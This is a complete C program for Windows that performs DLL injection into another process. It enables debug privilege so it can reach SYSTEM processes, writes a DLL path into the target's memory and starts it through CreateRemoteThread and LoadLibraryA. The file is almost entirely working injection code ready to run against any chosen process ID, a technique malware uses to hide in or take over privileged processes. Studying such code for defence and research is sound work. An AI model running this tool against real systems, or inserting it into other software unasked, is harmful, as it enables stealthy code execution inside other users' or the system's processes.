#define _WIN32_WINNT _WIN32_WINNT_WINXP

#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege);

int main(int argc, char *argv[]) {

	puts("===DLL Injection with CreateRemoteThread function===");

	// Check number of arguments
	if (argc != 3) { // Program name + 2 arguments
		puts("Use: DLLInjector.exe [PID] [DLL full path name]");
		exit(1);
	}

	// Enable debug privilege to inject in SYSTEM process
	puts("- Step 0: Set debug privilege...");
	HANDLE currentProc = GetCurrentProcess();
	HANDLE token;
	if (OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES, &token)) {
		BOOL bPriv = SetPrivilege(token, SE_DEBUG_NAME, TRUE);
		if (bPriv == FALSE) {
			puts("\tFailed to set debug privilege.");
			exit(1);
		}
		CloseHandle(token);
	}

	// Get the handle of the remote process
	DWORD procID = atoi(argv[1]); // Convert PID from Char to Int
	printf("- Step 1: Attaching to process %d\n", procID);
	HANDLE remoteProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (remoteProc == NULL) {
		puts("\tFailed to open process.");
		printf("Error code %d", GetLastError());
		exit(1);
	}

	// Allocate memory to the remote process
	puts("- Step 2: Allocating Memory for full path of dll to inject...");
	LPVOID dllPathAddr = VirtualAllocEx(remoteProc, 0, strlen(argv[2]), MEM_COMMIT, PAGE_READWRITE);
	if (dllPathAddr == NULL) {
		puts("\tFailed to allocate memory for dll path name.");
		exit(1);
	}

	// Copy the injected DLL path into the memory allocated
	puts("- Step 3: Writing full path of dll to inject into memory");
	SIZE_T bytes_w = 0;
	SIZE_T *bytesWritten = &bytes_w;
	WriteProcessMemory(remoteProc, dllPathAddr, argv[2], strlen(argv[2]), bytesWritten);
	if (*bytesWritten == 0) {
		puts("\tFailed to inject the dll path into memory.");
		exit(1);
	}
	printf("\t%d bytes written.\n", *bytesWritten);

	// Get the address of the function LoadLibraryA() in the remote process
	puts("- Step 4: Getting address of loadLibraryA");
	FARPROC loadLibAddr = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
	if (loadLibAddr == NULL) {
		puts("\tFailed to get LoadLibraryA address.");
		exit(1);
	}

	// Execute the injected DLL with CreateRemoteThread() function
	puts("- Step 5: DLL execution...");
	HANDLE injThread = CreateRemoteThread(remoteProc, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibAddr, dllPathAddr, 0, NULL);
	if (injThread == NULL) {
		puts("\tFailed to exec the thread.");
		exit(1);
	}

	// Wait for the end of the thread
	WaitForSingleObject(injThread, INFINITE);

	return 0;
}

// https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege) {
	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, Privilege, &luid)) {
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

		if (AdjustTokenPrivileges(hToken, FALSE, &tp, (DWORD)NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			bRet = (GetLastError() == ERROR_SUCCESS);
	}
	return bRet;
}